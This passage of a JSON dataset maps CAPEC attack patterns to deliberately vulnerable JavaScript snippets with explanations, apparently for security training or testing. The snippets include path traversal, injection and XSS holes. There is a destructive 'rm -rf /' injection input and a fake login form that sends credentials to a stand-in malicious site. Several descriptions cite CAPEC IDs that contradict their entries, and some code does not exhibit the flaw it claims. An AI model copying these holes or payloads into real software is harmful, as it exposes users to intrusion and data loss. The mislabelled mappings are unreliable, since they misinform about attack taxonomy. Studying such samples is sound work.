        "description": "This JavaScript code snippet demonstrates a vulnerability where user-controlled variables are directly used to modify application settings without proper sanitization or validation. The Express.js server has an endpoint '/updateSettings' that takes query parameters 'debug' and 'theme' from the user and applies them to the application settings. This can lead to various security issues such as external control of system settings (CWE-15), improper authorization (CWE-285), and potential code injection (CWE-94). The code represents the main idea of CAPEC-137 by showing how untrusted user input can manipulate critical application variables."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(filePath) {\n  // Validate input before canonicalization\n  if (!filePath.match(/^[a-zA-Z0-9_\\/]+$/)) {\n    throw new Error('Invalid file path');\n  }\n\n  // Canonicalize the path\n  const canonicalPath = filePath.replace(/\\\\/g, '/');\n\n  // Validate the canonicalized path\n  if (!canonicalPath.startsWith('/restricted/')) {\n    throw new Error('Path traversal attempt detected');\n  }\n\n  // Read the file\n  fs.readFile(canonicalPath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('..\\\\etc\\\\passwd');",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to the CAPEC 'Using Escaped Slashes in Alternate Encoding'. The function `readFile` takes a file path as input and attempts to read the file. Initially, it validates the input path using a regular expression, but this validation occurs before canonicalization. The canonicalization step replaces backslashes with forward slashes, which can lead to bypassing the initial validation. After canonicalization, the code checks if the path starts with '/restricted/' to prevent path traversal attacks. However, due to the incorrect order of validation and canonicalization, an attacker can exploit this to access restricted files. This snippet embodies CWE-180 (Incorrect Behavior Order: Validate Before Canonicalize), CWE-22 (Path Traversal), and CWE-173 (Improper Handling of Alternate Encoding)."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(filePath) {\n  // Validate input before canonicalization\n  if (!filePath.match(/^[a-zA-Z0-9_\\/\\\\]+$/)) {\n    throw new Error('Invalid file path');\n  }\n\n  // Canonicalize the path\n  const canonicalPath = path.normalize(filePath);\n\n  // Check if the path is within the allowed directory\n  const baseDir = path.resolve('/allowed/directory');\n  if (!canonicalPath.startsWith(baseDir)) {\n    throw new Error('Path traversal attempt detected');\n  }\n\n  // Read the file\n  return fs.readFileSync(canonicalPath, 'utf8');\n}\n\n// Example usage\ntry {\n  const data = readFile('../etc/passwd');\n  console.log(data);\n} catch (err) {\n  console.error(err.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable file reading function that embodies the main idea of CAPEC-147: Using Slashes in Alternate Encoding. The function `readFile` takes a file path as input and attempts to read the file. The code initially validates the input using a regular expression to check for valid characters, but this validation occurs before canonicalizing the path, which is a common mistake (CWE-180). The path is then canonicalized using `path.normalize`, but the subsequent check to ensure the path is within an allowed directory is flawed because it does not account for alternate encodings of slashes (CWE-22). This can lead to path traversal attacks, allowing an attacker to access sensitive files outside the intended directory. The example usage demonstrates how an attacker might exploit this vulnerability by providing a path like '../etc/passwd'."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit', (req, res) => {\n  const userInput = req.body.input;\n  // Validate input before canonicalization\n  if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n    return res.status(400).send('Invalid input');\n  }\n  // Canonicalize input\n  const canonicalInput = decodeURIComponent(escape(userInput));\n  // Use the input in a file path\n  const filePath = `/uploads/${canonicalInput}.txt`;\n  res.send(`File path is: ${filePath}`);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that accepts POST requests. The server validates user input before canonicalizing it, which is a common mistake (CWE-180). The input is then used to construct a file path (CWE-73). The validation step uses a regular expression to check if the input contains only alphanumeric characters, but this validation occurs before the input is canonicalized, making it possible to bypass the validation using UTF-8 encoded characters. This demonstrates the CAPEC concept of using UTF-8 encoding to bypass validation logic. The code also highlights the importance of proper input validation and canonicalization order to prevent security vulnerabilities."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const logEntry = `${new Date().toISOString()} - ${req.method} ${req.url} - ${req.headers['user-agent']}`;\n  fs.appendFile('server.log', logEntry + '\\n', (err) => {\n    if (err) throw err;\n  });\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Logged request');\n}).listen(8080);\n\n// Vulnerable to log tampering\n// An attacker can inject CRLF sequences into the logEntry, potentially tampering with the log file\n// Example: http://localhost:8080/?user-agent=Mozilla/5.0%0A%0DInjected%20Log%20Entry",
        "description": "This JavaScript code snippet creates a simple HTTP server that logs incoming requests to a file named 'server.log'. The log entry includes the current timestamp, HTTP method, URL, and the 'User-Agent' header from the request. However, the code is vulnerable to log tampering attacks (CAPEC-116). An attacker can inject CRLF sequences into the 'User-Agent' header, which can manipulate the log file by adding new lines or entries. This vulnerability is related to CWE-93 (CRLF Injection) and CWE-117 (Improper Output Neutralization for Logs). The code does not sanitize or neutralize special characters in the input, making it susceptible to log injection attacks."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/upload', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, { explicitArray: false }, (err, result) => {\n    if (err) {\n      return res.status(400).send('Invalid XML');\n    }\n    // Process the XML data\n    res.send('XML processed successfully');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request. The XML data is parsed using the xml2js library without any validation against a schema, which embodies the CWE-112 (Missing XML Validation) vulnerability. Additionally, the code does not neutralize special elements in the XML, making it susceptible to CWE-91 (XML Injection). The lack of restrictions on external entity references and recursive entity definitions in the XML further exposes the server to CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-776 (Improper Restriction of Recursive Entity References in DTDs). This code represents the main idea of the deprecated CAPEC, which involves vulnerabilities related to improper handling of XML content, potentially leading to XML Denial of Service (XDoS) attacks."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const xmlData = `<users><user><username>${username}</username><password>${password}</password></user></users>`;\n\n  xml2js.parseString(xmlData, (err, result) => {\n    if (err) {\n      res.status(500).send('Error parsing XML');\n      return;\n    }\n    // Simulate XPath query\n    const user = result.users.user.find(u => u.username[0] === username && u.password[0] === password);\n    if (user) {\n      res.send('Login successful');\n    } else {\n      res.send('Invalid credentials');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable web application using Express.js that is susceptible to XPath Injection. The application accepts a username and password via a POST request to the '/login' endpoint. It constructs an XML string with the user-provided input and parses it using the xml2js library. The code then simulates an XPath query to find a matching user. However, the input is not properly sanitized, allowing an attacker to inject malicious XPath expressions. This can lead to unauthorized access or information disclosure, embodying the main idea of CAPEC-91 (XPath Injection) and related CWEs such as CWE-643 (Improper Neutralization of Data within XPath Expressions)."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst xml2js = require('xml2js');\nconst fs = require('fs');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search', (req, res) => {\n  const userInput = req.body.query;\n  const xquery = `for $x in doc('users.xml')/users/user where $x/name = '${userInput}' return $x`;\n  fs.readFile('users.xml', 'utf8', (err, data) => {\n    if (err) throw err;\n    xml2js.parseString(data, (err, result) => {\n      if (err) throw err;\n      // Simulate XQuery execution (vulnerable to injection)\n      const users = result.users.user.filter(user => user.name[0] === userInput);\n      res.send(users);\n    });\n  });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "description": "This JavaScript code snippet demonstrates a vulnerable web application using Express.js. The application accepts user input through a POST request to the '/search' endpoint. The user input is directly embedded into an XQuery expression without proper neutralization, making it susceptible to XQuery Injection attacks. An attacker can manipulate the 'query' parameter to alter the structure of the XQuery and potentially access unauthorized data. This example embodies the main idea of CAPEC-74 and related CWEs, highlighting the risks of improper neutralization of user input in XQuery expressions."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "function fetchData() {\n    var xhr = new XMLHttpRequest();\n    xhr.open('GET', '/api/data?param=' + document.location.hash.substring(1), true);\n    xhr.onreadystatechange = function() {\n        if (xhr.readyState == 4 && xhr.status == 200) {\n            document.getElementById('output').innerHTML = xhr.responseText;\n        }\n    };\n    xhr.send();\n}\n\nwindow.onload = function() {\n    fetchData();\n    setInterval(fetchData, 5000); // Frequent AJAX requests\n};",
        "description": "This JavaScript code snippet demonstrates an AJAX footprinting scenario. The `fetchData` function sends an AJAX request to the server, appending a parameter from the URL hash. The server's response is then inserted into the DOM without proper sanitization. This code is executed on page load and repeatedly every 5 seconds, simulating frequent client-server roundtrips typical in AJAX applications. The lack of input validation (CWE-20), improper neutralization of input (CWE-79), and improper encoding or escaping of output (CWE-116) make this code vulnerable to attacks such as XSS. An attacker can exploit these vulnerabilities to gather information about the system and potentially launch further attacks."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const userAgent = req.headers['user-agent'];\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end(`<html><body><h1>Welcome!</h1><p>Your user agent is: ${userAgent}</p></body></html>`);\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server using Node.js. The server reads the 'User-Agent' header from incoming HTTP requests and includes it directly in the HTML response without any validation or sanitization. This represents the main idea of CAPEC-86 (XSS Through HTTP Headers) and related CWEs, particularly CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax) and CWE-79 (Improper Neutralization of Input During Web Page Generation). An attacker could exploit this by sending a malicious 'User-Agent' header containing script tags, leading to Cross-Site Scripting (XSS) vulnerabilities."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Simulated user roles\nconst users = {\n  'user1': 'admin',\n  'user2': 'user'\n};\n\n// Middleware to check authentication\nfunction isAuthenticated(req, res, next) {\n  if (req.query.user && users[req.query.user]) {\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n}\n\n// Middleware to check authorization\nfunction isAuthorized(req, res, next) {\n  const userRole = users[req.query.user];\n  if (userRole === 'admin' || req.path === '/public') {\n    next();\n  } else {\n    res.status(403).send('Forbidden');\n  }\n}\n\n// Public route\napp.get('/public', (req, res) => {\n  res.send('This is a public page.');\n});\n\n// Admin route\napp.get('/admin', isAuthenticated, isAuthorized, (req, res) => {\n  res.send('This is an admin page.');\n});\n\n// Start the server\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This code snippet demonstrates a basic Express.js application with two routes: a public route and an admin route. The 'isAuthenticated' middleware checks if the user is authenticated by verifying the presence of a user query parameter. The 'isAuthorized' middleware checks if the authenticated user has the appropriate role to access the admin route. The code is vulnerable to forceful browsing (CAPEC-111) because it relies on query parameters for authentication and authorization, which can be easily manipulated. Additionally, it uses the GET method with sensitive information in the query string (CWE-598), and it does not adequately enforce authorization on all restricted URLs (CWE-425)."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeCommand(userInput) {\n  exec(`ls ${userInput}`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// Example usage\nexecuteCommand(''); // Safe input\nexecuteCommand('&& rm -rf /'); // Malicious input",
        "description": "This JavaScript code snippet demonstrates an OS Command Injection vulnerability. The `executeCommand` function takes user input and directly incorporates it into an `exec` call to list directory contents using the `ls` command. This is vulnerable to injection attacks because the user input is not properly sanitized or validated. An attacker can inject malicious commands, such as `&& rm -rf /`, to execute arbitrary commands on the server. This example embodies the main idea of CAPEC-88 and related CWEs, highlighting the risks of improper neutralization of special elements and improper input validation."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst targetHost = 'trustedbank.com';\nconst maliciousIP = '192.168.1.100';\n\nhttp.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  dns.reverse(clientIP, (err, hostnames) => {\n    if (err || !hostnames.includes(targetHost)) {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Access Denied');\n      return;\n    }\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.end('<html><body>Welcome to Trusted Bank</body></html>');\n  });\n}).listen(8080);\n\n// Simulate DNS poisoning\ndns.setServers([maliciousIP]);",
        "description": "This JavaScript code snippet sets up a basic HTTP server that attempts to validate the client's IP address using reverse DNS resolution before serving content. The server checks if the client's IP address resolves to 'trustedbank.com'. If not, it denies access. The code also simulates DNS poisoning by setting a malicious DNS server IP. This demonstrates CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) and CWE-346 (Origin Validation Error), which are related to pharming attacks where attackers redirect users to malicious sites. The code highlights the vulnerability of relying on reverse DNS for security decisions, which can be exploited in pharming attacks."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Echo the received challenge back to the client\n    socket.write(data);\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\nclient.connect(1337, '127.0.0.1', () => {\n  const challenge = 'CHALLENGE_STRING';\n  client.write(challenge);\n\n  client.on('data', (data) => {\n    if (data.toString() === challenge) {\n      console.log('Authentication successful');\n    } else {\n      console.log('Authentication failed');\n    }\n    client.destroy();\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a simple reflection attack vulnerability in an authentication protocol. The server listens for incoming connections and echoes back any received data. The client sends a challenge string to the server and expects the same string in response to authenticate successfully. This setup is vulnerable to reflection attacks because an attacker can intercept the challenge and reflect it back to the server, thereby bypassing the authentication mechanism. This example highlights CWE-301 (Reflection Attack in an Authentication Protocol) and CWE-303 (Incorrect Implementation of Authentication Algorithm) by showing how a simple echo server can be exploited to bypass authentication."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "<html>\n<body>\n  <form method=\"post\" action=\"submit.php\">\n    <label for=\"imageUrl\">Image URL:</label>\n    <input type=\"text\" id=\"imageUrl\" name=\"imageUrl\">\n    <input type=\"submit\" value=\"Submit\">\n  </form>\n\n  <script>\n    document.forms[0].onsubmit = function(e) {\n      e.preventDefault();\n      var imageUrl = document.getElementById('imageUrl').value;\n      var imgTag = '<img src=\"' + imageUrl + '\" />';\n      document.body.innerHTML += imgTag;\n    };\n  </script>\n</body>\n</html>",
        "description": "This code snippet demonstrates a vulnerable web application where user input is directly inserted into an IMG tag without proper sanitization. The form allows users to submit an image URL, which is then used to create an IMG tag and append it to the body of the document. This is vulnerable to XSS attacks because an attacker can input a malicious script in the image URL, such as 'javascript:alert(1)', which will be executed when the IMG tag is rendered. This example embodies the main idea of CAPEC-18 and related CWEs, highlighting improper neutralization of script in attributes of IMG tags, improper neutralization of alternate XSS syntax, and the use of incomplete denylist mechanisms."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "function allocateBuffer(size) {\n  // CWE-190: Integer Overflow or Wraparound\n  var bufferSize = size + 1;\n  \n  // CWE-680: Integer Overflow to Buffer Overflow\n  var buffer = new ArrayBuffer(bufferSize);\n  var view = new Uint8Array(buffer);\n  \n  // CWE-120: Buffer Copy without Checking Size of Input\n  for (var i = 0; i <= size; i++) {\n    view[i] = 0x41; // Fill buffer with 'A'\n  }\n  \n  return buffer;\n}\n\n// Example usage\nvar size = 0xFFFFFFFF; // Large value to cause overflow\nvar buf = allocateBuffer(size);",
        "description": "This JavaScript code snippet demonstrates a forced integer overflow vulnerability. The function `allocateBuffer` takes a `size` parameter and attempts to allocate a buffer of `size + 1` bytes. If `size` is set to a large value (e.g., 0xFFFFFFFF), adding 1 causes an integer overflow, resulting in a very small or negative buffer size. This can lead to a buffer overflow when the code tries to fill the buffer with data. The code embodies the main idea of CAPEC-128 (Forced Integer Overflow) and incorporates related CWEs such as CWE-190 (Integer Overflow or Wraparound), CWE-680 (Integer Overflow to Buffer Overflow), and CWE-120 (Buffer Copy without Checking Size of Input)."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.use(express.json());\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n\n  // Log the login attempt\n  fs.appendFile('server.log', `Login attempt: ${username}, Password: ${password}\\n`, (err) => {\n    if (err) throw err;\n  });\n\n  // Simulate login process\n  if (username === 'admin' && password === 'password') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable logging mechanism in an Express.js application. The code logs user login attempts directly to a file without proper sanitization or neutralization of the input. This can lead to log injection attacks where an attacker can manipulate log entries by injecting special characters or control sequences. Additionally, sensitive information such as passwords is logged, which can expose sensitive data and aid attackers. This example embodies the main idea of CAPEC-117, CAPEC-75, CAPEC-150, CAPEC-532, and CAPEC-779 by demonstrating improper output neutralization, failure to sanitize special elements, and logging of sensitive information."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "const http = require('http');\nconst net = require('net');\n\nconst proxy = http.createServer((req, res) => {\n  const options = {\n    hostname: req.headers['host'],\n    port: 80,\n    path: req.url,\n    method: req.method,\n    headers: req.headers\n  };\n\n  const proxyReq = http.request(options, (proxyRes) => {\n    proxyRes.pipe(res, {\n      end: true\n    });\n  });\n\n  req.pipe(proxyReq, {\n    end: true\n  });\n});\n\nproxy.on('connect', (req, clientSocket, head) => {\n  const { port, hostname } = new URL(`http://${req.url}`);\n  const serverSocket = net.connect(port || 80, hostname, () => {\n    clientSocket.write('HTTP/1.1 200 Connection Established\\r\\n' +\n                       'Proxy-agent: Node.js-Proxy\\r\\n' +\n                       '\\r\\n');\n    serverSocket.write(head);\n    serverSocket.pipe(clientSocket);\n    clientSocket.pipe(serverSocket);\n  });\n});\n\nproxy.listen(8080, () => {\n  console.log('Proxy server listening on port 8080');\n});",
        "description": "This JavaScript code snippet sets up a basic HTTP proxy server using Node.js. The proxy server listens on port 8080 and forwards HTTP requests and responses between the client and the target server. The 'connect' event handler allows the proxy to handle HTTPS connections by establishing a tunnel between the client and the server. This setup embodies the concept of an 'Adversary in the Middle (AiTM)' attack, where an attacker intercepts and potentially alters communication between a client and a server. The code does not implement any authentication or integrity checks, making it vulnerable to various attacks such as 'Channel Accessible by Non-Endpoint' (CWE-300), 'Improper Authentication' (CWE-287), and 'Authentication Bypass by Capture-replay' (CWE-294)."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  if (req.method === 'GET' && queryObject.wsdl) {\n    // Simulate exposure of sensitive WSDL information\n    const wsdlInfo = `<?xml version=\"1.0\"?>\n<definitions>\n  <service name=\"SensitiveService\">\n    <port name=\"SensitivePort\" binding=\"tns:SensitiveBinding\">\n      <soap:address location=\"http://example.com/sensitive\"/>\n    </port>\n  </service>\n</definitions>`;\n    res.writeHead(200, {'Content-Type': 'application/xml'});\n    res.end(wsdlInfo);\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that listens for GET requests containing a 'wsdl' query parameter. If such a request is received, the server responds with a simulated WSDL file containing sensitive information about a web service. This demonstrates the vulnerability described in CAPEC-220 (WSDL Scanning) and related CWEs, particularly CWE-651 (Exposure of WSDL File Containing Sensitive Information) and CWE-598 (Use of GET Request Method With Sensitive Query Strings). The code highlights how an attacker could exploit exposed WSDL files to gain insights into the web service's structure and potentially discover other vulnerabilities."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "const fs = require('fs');\n\nfunction readConfigFile(filePath) {\n  try {\n    if (!fs.existsSync(filePath)) {\n      throw new Error('Configuration file not found');\n    }\n    const data = fs.readFileSync(filePath, 'utf8');\n    return JSON.parse(data);\n  } catch (err) {\n    console.error('Error reading configuration file:', err.message);\n    // Fallback to default configuration\n    return { defaultConfig: true };\n  }\n}\n\nconst config = readConfigFile('/path/to/config.json');\nconsole.log('Configuration:', config);",
        "description": "This JavaScript code snippet demonstrates a scenario where an application attempts to read a configuration file using the 'fs' library. The 'readConfigFile' function checks if the file exists and reads its content. If the file is not found or an error occurs during reading, it catches the error and logs it, then falls back to a default configuration. This represents the CAPEC idea of handling blocked access to libraries (in this case, the file system library) and ensuring the application does not enter an insecure state. The related CWEs are reflected in the error handling and fallback mechanism to avoid issues like using non-ubiquitous APIs, improper memory operations, or including untrusted functionality."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "const crypto = require('crypto');\n\n// Using a weak cryptographic algorithm (CWE-327)\nconst algorithm = 'des-ecb'; // DES is considered broken and risky\nconst key = crypto.randomBytes(8); // DES key size is 8 bytes\nconst iv = Buffer.alloc(8, 0); // Weak IV (CWE-1204)\n\nconst cipher = crypto.createCipheriv(algorithm, key, iv);\nlet encrypted = cipher.update('Sensitive Data', 'utf8', 'hex');\nencrypted += cipher.final('hex');\n\nconsole.log('Encrypted:', encrypted);\n\n// Using a predictable random number generator (CWE-1241)\nfunction predictableRandom() {\n  return Math.floor(Math.random() * 100); // Predictable RNG\n}\n\nconsole.log('Predictable Random Number:', predictableRandom());",
        "description": "This JavaScript code snippet demonstrates several cryptographic weaknesses as described in the CAPEC and related CWEs. It uses the DES algorithm in ECB mode, which is considered broken and risky (CWE-327). The initialization vector (IV) is set to a fixed value, making it weak and predictable (CWE-1204). Additionally, the code includes a function that generates a predictable random number (CWE-1241). These vulnerabilities can be exploited by attackers to perform cryptanalysis and potentially decipher the ciphertext without knowing the secret key."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "function redirectToPhishingSite() {\n  var userInput = document.getElementById('userInput').value;\n  var redirectUrl = 'http://trusted-site.com?redirect=' + encodeURIComponent(userInput);\n  window.location.href = redirectUrl;\n}\n\nfunction displayFakeLogin() {\n  var loginForm = '<form action=\"http://malicious-site.com/login\" method=\"POST\">' +\n                  '<input type=\"text\" name=\"username\" placeholder=\"Username\" />' +\n                  '<input type=\"password\" name=\"password\" placeholder=\"Password\" />' +\n                  '<input type=\"submit\" value=\"Login\" />' +\n                  '</form>';\n  document.getElementById('loginContainer').innerHTML = loginForm;\n}\n\n// Simulate user clicking on a phishing link\nredirectToPhishingSite();\n\n// Display a fake login form to capture credentials\nwindow.onload = function() {\n  displayFakeLogin();\n};",
        "description": "This JavaScript code snippet demonstrates a phishing attack by combining URL redirection to an untrusted site (CWE-601) and a fake login form to capture user credentials. The `redirectToPhishingSite` function takes user input and constructs a URL that redirects to a trusted site but includes a user-controlled parameter, which can be manipulated to redirect to a malicious site. The `displayFakeLogin` function creates a fake login form that sends user credentials to a malicious site. When the page loads, the user is redirected to the phishing site, and a fake login form is displayed to capture their credentials. This code embodies the main idea of phishing by masquerading as a legitimate entity to gather confidential information."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/parse-xml', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, (err, result) => {\n    if (err) {\n      return res.status(400).send('Invalid XML');\n    }\n    // Process the XML data\n    res.send('XML processed successfully');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request. The XML data is parsed using the xml2js library. However, the code does not validate the XML against a schema (CWE-112), does not properly neutralize special elements (CWE-91), and does not restrict XML external entity references (CWE-611). This makes the application vulnerable to various XML-based attacks, such as XML Injection, XML External Entity (XXE) attacks, and processing of malicious XML payloads."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "function vulnerableFunction(input) {\n  var buffer = new Array(10);\n  for (var i = 0; i <= input.length; i++) {\n    buffer[i] = input[i];\n  }\n}\n\n// Example usage\nvar userInput = 'A'.repeat(20);\nvulnerableFunction(userInput);",
        "description": "This JavaScript code snippet demonstrates a classic buffer overflow vulnerability. The function 'vulnerableFunction' takes an input string and attempts to copy its contents into a fixed-size buffer of length 10. However, there is no bounds checking to ensure that the input length does not exceed the buffer size. As a result, if the input is longer than 10 characters, it will write past the boundaries of the allocated buffer, leading to a buffer overflow. This example embodies the main idea of CAPEC-1000 (Overflow Buffers) and is related to CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const filePath = `./pages/${queryObject.page}.html`;\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/html'});\n      res.end('404 Not Found');\n      return;\n    }\n\n    // Vulnerable to SSI Injection\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.end(data);\n  });\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads an HTML file based on user input from the URL query parameter 'page' and serves it as a response. The code is vulnerable to Server Side Include (SSI) Injection because it directly uses user input to construct the file path without proper validation or sanitization. An attacker could exploit this by providing a malicious 'page' parameter that includes SSI directives, leading to arbitrary code execution or information disclosure. This example also highlights related weaknesses such as improper input validation (CWE-20), improper neutralization of special elements (CWE-74), and unparsed raw web content delivery (CWE-433)."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const credentials = JSON.parse(body);\n      // Simulate session token generation\n      const sessionToken = 'session12345';\n      res.setHeader('Set-Cookie', `sessionToken=${sessionToken}`);\n      res.end('Logged in');\n    });\n  } else if (req.url === '/dashboard') {\n    const cookies = req.headers.cookie;\n    if (cookies && cookies.includes('sessionToken=session12345')) {\n      res.end('Welcome to your dashboard');\n    } else {\n      res.end('Unauthorized');\n    }\n  } else {\n    res.end('Not Found');\n  }\n});\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js that handles login and dashboard requests. The login endpoint accepts POST requests with user credentials, simulates session token generation, and sets a session token in a cookie without the 'Secure' attribute. The dashboard endpoint checks for the session token in the cookies to authorize access. This code embodies the main idea of CAPEC-Session Sidejacking by transmitting sensitive information (session token) in cleartext and without proper security attributes, making it vulnerable to interception and unauthorized access. The related CWEs are represented by the lack of secure transmission (CWE-319), unprotected transport of credentials (CWE-523), and insufficiently protected credentials (CWE-522)."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "<html>\n<head>\n  <style>\n    iframe {\n      position: absolute;\n      top: 0;\n      left: 0;\n      width: 100%;\n      height: 100%;\n      opacity: 0;\n      z-index: 2;\n    }\n    button {\n      position: relative;\n      z-index: 1;\n    }\n  </style>\n</head>\n<body>\n  <button onclick=\"alert('Clicked!')\">Click Me!</button>\n  <iframe src=\"http://malicious-site.com\"></iframe>\n</body>\n</html>",
        "description": "This code snippet demonstrates a basic clickjacking attack. The main idea is to trick the user into clicking on an element within an iframe that is controlled by an attacker, while the user believes they are interacting with a different UI element. The iframe is made invisible using CSS (opacity: 0) and is positioned over a legitimate button. When the user tries to click the button, they are actually clicking on the iframe, which could lead to unintended actions. This example embodies the CAPEC description of clickjacking and relates to CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by not restricting the iframe from overlaying the button, leading to user confusion and potential malicious actions."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
